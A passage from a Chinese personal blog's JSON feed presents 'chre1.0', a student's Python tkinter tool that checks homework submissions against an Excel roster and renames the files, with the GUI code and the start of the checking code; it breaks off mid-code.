{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie",
    "description": "学习博客",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/12/01/program/py/pysolve/chre1.0/",
            "url": "http://example.com/2021/12/01/program/py/pysolve/chre1.0/",
            "title": "chre1.0",
            "date_published": "2021-11-30T17:15:29.817Z",
            "content_html": "<p>项目：check and rename 1.0</p>\n<p>作者：Fanqie</p>\n<p>最后时间：2021.11.30</p>\n<p>功能：通过 excel 实现对文件的查缺和统一改名</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<div class=\"note info\">\n<p>本文及文中代码未经允许禁止私自转载或使用！</p>\n</div>\n<h1 id=\"background\"><a class=\"anchor\" href=\"#background\">#</a> Background</h1>\n<p>我认为编程的初衷就是为了解决学术或生活上一些难题或麻烦的事，根据自身的需求去定制代码，会为工作带来了极大的便利。所以在我经历了不少的的苦头后，就萌生了写这个工具的想法。</p>\n<p>实话说，当学委太累了（经常要收作业，收作业中间又会产生很多问题），so 专门花了几天时间写了这个软件，算是让自己偷个懒吧～～</p>\n<p>同时也希望这个工具（不仅是用来收作业）能帮到更多的人（<strong>一劳永逸</strong>），毕竟谁不想偷懒呢？！！</p>\n<div class=\"note primary\">\n<p><strong>顺便一提：版本号本来是不准备加的，但是工具的代码有漏洞和缺陷（见后文），以后闲了我会不断抽时间完善，所以加上了版本号</strong></p>\n</div>\n<h1 id=\"target\"><a class=\"anchor\" href=\"#target\">#</a> Target</h1>\n<p>总结一下，我认为它解决了以下的问题（帮我偷懒）：</p>\n<ul>\n<li>解决了每次收过来的作业格式乱七八糟，强迫症很难受</li>\n<li>解决了每次因为缺人导致的作业收不齐</li>\n<li>解决了不知道是不是有漏收作业（在对方交了的情况下）</li>\n<li>解决了老师所要求的格式不符问题</li>\n<li>大大减少了每次收作业的时间（不止是作业）</li>\n<li>大大改善了每次收作业时影响同学之间的关系</li>\n<li>大大降低了工作的出错率，提高了自己的容错率</li>\n</ul>\n<h1 id=\"address\"><a class=\"anchor\" href=\"#address\">#</a> Address</h1>\n<p>提供两个地址</p>\n<p>github: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzI3NDA5MDg5MTEvMjc0MDkwODkxMS5naXRodWIuaW8vdHJlZS9tYXN0ZXIvcHJvZ3JhbQ==\">Fanqie</span></p>\n<p>百度网盘：</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXhNY2stWlNvZE94cGNId080UkRFUnc=\">https://pan.baidu.com/s/1xMck-ZSodOxpcHwO4RDERw</span><br>\n 提取码：rngi</p>\n<h1 id=\"main-code-displayanalysis\"><a class=\"anchor\" href=\"#main-code-displayanalysis\">#</a> Main code display&amp;analysis</h1>\n<ul>\n<li><strong>主界面实现 (界面示例)</strong></li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> parent_window<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\tparent_window<span class=\"token punctuation\">.</span>destroy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 销毁主界面</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>window <span class=\"token operator\">=</span> tk<span class=\"token punctuation\">.</span>Tk<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 初始框的声明</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>window<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token string\">'check or rename'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>width <span class=\"token operator\">=</span> <span class=\"token number\">450</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>height <span class=\"token operator\">=</span> <span class=\"token number\">330</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token comment\">#获取屏幕尺寸以计算布局参数，使窗口居屏幕中央</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>screenwidth <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>window<span class=\"token punctuation\">.</span>winfo_screenwidth<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>screenheight <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>window<span class=\"token punctuation\">.</span>winfo_screenheight<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>alignstr <span class=\"token operator\">=</span> <span class=\"token string\">'%dx%d+%d+%d'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>width<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                  <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>screenwidth<span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>width<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>screenheight<span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>height<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>window<span class=\"token punctuation\">.</span>geometry<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>alignstr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>window<span class=\"token punctuation\">.</span>resizable<span class=\"token punctuation\">(</span>width<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token comment\"># 定义框架</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex0 <span class=\"token operator\">=</span> tk<span class=\"token punctuation\">.</span>Frame<span class=\"token punctuation\">(</span>width<span class=\"token operator\">=</span><span class=\"token number\">600</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">=</span><span class=\"token number\">80</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex2 <span class=\"token operator\">=</span> tk<span class=\"token punctuation\">.</span>Frame<span class=\"token punctuation\">(</span>width<span class=\"token operator\">=</span><span class=\"token number\">700</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">=</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\t</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex4 <span class=\"token operator\">=</span> tk<span class=\"token punctuation\">.</span>Frame<span class=\"token punctuation\">(</span>width<span class=\"token operator\">=</span><span class=\"token number\">700</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">=</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\t</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\"># 定义标题</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex0_title <span class=\"token operator\">=</span> Label<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex0<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">\"check&amp;rename:\"</span><span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> fg<span class=\"token operator\">=</span><span class=\"token string\">\"green\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex0_title<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">#定义路径</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>path1 <span class=\"token operator\">=</span> StringVar<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>excel <span class=\"token operator\">=</span> StringVar<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">#查找功能</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_label <span class=\"token operator\">=</span> Label<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">\"查找未上交：\"</span><span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_button1 <span class=\"token operator\">=</span> ttk<span class=\"token punctuation\">.</span>Button<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">'添加文件夹'</span><span class=\"token punctuation\">,</span>command <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>selectPath1<span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_entry1 <span class=\"token operator\">=</span> Entry<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">,</span> textvariable <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>path1<span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_button2 <span class=\"token operator\">=</span> ttk<span class=\"token punctuation\">.</span>Button<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">'添加Excel'</span><span class=\"token punctuation\">,</span>command <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>selectexcel<span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_entry2 <span class=\"token operator\">=</span> Entry<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">,</span> textvariable <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>excel<span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_button3 <span class=\"token operator\">=</span> ttk<span class=\"token punctuation\">.</span>Button<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">'开始'</span><span class=\"token punctuation\">,</span> command<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>docmiss_nation<span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_label<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_button1<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_entry1<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> columnspan<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_button2<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_entry2<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> columnspan<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex2_button3<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> padx<span class=\"token operator\">=</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t<span class=\"token comment\">#改名功能</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_label <span class=\"token operator\">=</span> Label<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">\"格式化命名：\"</span><span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_button1 <span class=\"token operator\">=</span> ttk<span class=\"token punctuation\">.</span>Button<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">'添加文件夹'</span><span class=\"token punctuation\">,</span>command <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>selectPath1<span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_entry1 <span class=\"token operator\">=</span> Entry<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">,</span> textvariable <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>path1<span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_button2 <span class=\"token operator\">=</span> ttk<span class=\"token punctuation\">.</span>Button<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">'添加Excel'</span><span class=\"token punctuation\">,</span>command <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>selectexcel<span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_entry2 <span class=\"token operator\">=</span> Entry<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">,</span> textvariable <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>excel<span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Verdana'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_button3 <span class=\"token operator\">=</span> ttk<span class=\"token punctuation\">.</span>Button<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token string\">'开始'</span><span class=\"token punctuation\">,</span> command<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>raname_nation<span class=\"token punctuation\">,</span> width<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_label<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_button1<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_entry1<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> columnspan<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_button2<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_entry2<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> columnspan<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>ex4_button3<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> padx<span class=\"token operator\">=</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token comment\">#grid 方法固定框架</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex0<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> padx<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> pady<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> padx<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> pady<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">.</span>grid<span class=\"token punctuation\">(</span>row<span class=\"token operator\">=</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> column<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> padx<span class=\"token operator\">=</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> pady<span class=\"token operator\">=</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex0<span class=\"token punctuation\">.</span>grid_propagate<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">.</span>grid_propagate<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">.</span>grid_propagate<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex0<span class=\"token punctuation\">.</span>tkraise<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 开始显示主菜单</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex2<span class=\"token punctuation\">.</span>tkraise<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>frame_ex4<span class=\"token punctuation\">.</span>tkraise<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\tself<span class=\"token punctuation\">.</span>window<span class=\"token punctuation\">.</span>mainloop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 进入消息循环</span></pre></td></tr></table></figure><ul>\n<li><strong>查缺功能（主要算法）</strong></li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>path <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>path1<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t\t<span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>excel<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t\twb <span class=\"token operator\">=</span> xlrd<span class=\"token punctuation\">.</span>open_workbook<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\tws <span class=\"token operator\">=</span> wb<span class=\"token punctuation\">.</span>sheet_by_name<span class=\"token punctuation\">(</span><span class=\"token string\">'Sheet1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\tdata_name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#名字简写</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t\tdata_stunum <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#学号</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\tdata_fullname <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#全名</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\tdata_total <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>  <span class=\"token comment\">#check list</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">for</span> <span class=\"token builtin\">len</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>nrows<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#excel 第一列放姓名，第二列放学号</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\tdata_name<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>cell_value<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\tdata_stunum<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>cell_value<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\tdata_fullname<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">.</span>cell_value<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token 